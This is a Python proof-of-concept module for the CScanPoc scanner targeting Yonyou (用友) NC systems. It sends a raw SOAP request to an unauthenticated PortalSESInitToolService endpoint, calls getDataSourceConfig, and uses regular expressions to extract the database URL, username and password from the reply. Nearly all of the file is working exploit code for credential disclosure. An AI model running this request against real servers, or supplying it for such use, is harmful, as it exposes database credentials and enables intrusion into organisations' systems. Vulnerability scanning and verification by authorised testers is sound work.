# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Yonyou_0039'  # 平台漏洞编号，留空
    name = '用友多个系统通用漏洞导致接口信息泄露引发多数据库信息泄露'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2015-05-13'  # 漏洞公布时间
    desc = '''
        用友是国内著名的内容管理系统之一，包括协同管理系统、用友NC、用友U8等
        用友多个系统通用漏洞导致接口信息泄露引发多数据库信息泄露
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0112834'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Yonyou(用友)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'fcdc33b4-ed38-4dfb-b965-f02a43a92aab'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))

        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg + "uapws/service/nc.itf.ses.inittool.PortalSESInitToolService"
            raw = """POST /uapws/service/nc.itf.ses.inittool.PortalSESInitToolService HTTP/1.1
Host: www.baidu.com
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/47.0.2526.73 Chrome/47.0.2526.73 Safari/537.36
DNT: 1
Accept-Encoding: gzip, deflate, sdch
Accept-Language: en-US,en;q=0.8,zh-CN;q=0.6,zh;q=0.4
Cookie: JSESSIONID=8094FB584D86D05EC578B3DA1A08BBA8.server
Content-Length: 349

<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><getDataSourceConfig xmlns="http://inittool.ses.itf.nc/PortalSESInitToolService"></getDataSourceConfig></soap:Body></soap:Envelope>"""

            code, head, res, errcode, _ = hh.http(url, raw=raw)
            if code == 200 and 'getDataSourceConfigResponse' in res:
                r = r'<ns1:getDataSourceConfigResponse xmlns:ns1="http://inittool.ses.itf.nc/\w+">(.+)</ns1:getDataSourceConfigResponse>'
                data = re.findall(r, res)
                if data:
                    r = r'<return>(.+?)</return>'
                    data = re.findall(r, data[0])
                    if len(data) >= 4:
                        text = "url->%s\r\nu->%s\r\np->%s\r\n" % (
                            data[1], data[2], data[3])
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
